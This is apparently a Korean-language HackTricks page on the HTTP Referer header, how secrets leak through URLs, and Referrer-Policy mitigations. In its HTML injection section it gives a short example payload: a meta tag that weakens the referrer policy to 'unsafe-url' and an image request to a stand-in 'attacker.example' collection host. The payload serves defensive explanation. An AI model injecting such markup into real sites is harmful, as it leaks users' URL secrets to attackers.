# Interesting HTTP 동작

{{#include ../banners/hacktricks-training.md}}

## `Referer` Header 및 Referrer Policy

HTTP `Referer` request header는 resource가 요청된 absolute 또는 partial URL을 식별합니다. 활성화된 referrer policy에 따라 referring origin, path 및 query string을 포함할 수 있지만 URL fragment는 포함하지 않습니다.<sup>[[1]](#references)</sup>

### 민감한 정보 Leakage

URL path 또는 query parameter의 secrets는 browser history, logs, analytics, copied links 및 `Referer` header를 통해 leak될 수 있습니다. 따라서 cross-origin link 또는 subresource request가 referring URL을 external server에 노출할 수 있습니다.<sup>[[2]](#references)</sup>

### 완화

`Referrer-Policy` response header를 사용하여 browser가 전송하는 referrer 정보의 양을 제어합니다. `strict-origin-when-cross-origin`은 browsers의 modern default이며, `no-referrer`는 header를 완전히 suppress합니다. 애플리케이션의 requirements에 맞는 policy를 선택하세요.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
비밀번호, session identifier, API key 또는 기타 민감한 값을 URL에 포함하지 마세요. 대신 TLS를 통해 적절한 request header 또는 body로 전송하세요.<sup>[[2]](#references)</sup>

### HTML Injection 고려 사항

문서는 `<meta name="referrer">`를 사용하여 페이지 전체에 적용되는 policy를 설정할 수도 있습니다. HTML injection 취약점으로 인해 공격자가 유효한 meta element를 삽입할 수 있다면, 공격자는 후속 request에 적용되는 문서의 policy를 약화하려고 시도할 수 있습니다. 동적으로 삽입되거나 충돌하는 meta policy는 예측할 수 없이 동작할 수 있으므로, response header가 항상 override된다고 가정하지 말고 대상 browser에서 동작을 확인하세요.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
근본적인 HTML injection을 수정하고 민감한 데이터를 URL에 포함하지 마세요. referrer policy는 defense in depth를 위한 조치일 뿐, 어느 통제도 대체할 수 없습니다.

## References

- [1] [MDN - `Referer` 헤더](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - 민감한 쿼리 문자열과 함께 GET Request Method 사용](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` 헤더](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
